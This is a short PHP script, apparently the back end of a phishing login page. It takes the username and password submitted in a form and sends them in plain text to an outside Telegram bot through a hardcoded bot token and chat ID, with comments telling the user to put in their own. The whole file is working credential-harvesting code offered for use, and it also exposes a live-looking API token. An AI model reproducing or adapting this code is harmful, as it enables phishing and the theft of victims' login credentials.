<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = htmlspecialchars($_POST["username"]);
    $password = htmlspecialchars($_POST["password"]);

    $botToken = "7376924106:AAFTGm6XCAbnzc-M5VeIRqMm-9I9859oxpQ";  // Replace with your Telegram bot token
    $chatId = "6199929198";      // Replace with your chat ID

    $message = "🚀 New Login Attempt\nUsername: $username\nPassword: $password";

    $url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);

    file_get_contents($url);  // Send request to Telegram

    echo "Login attempt recorded!";
}
?>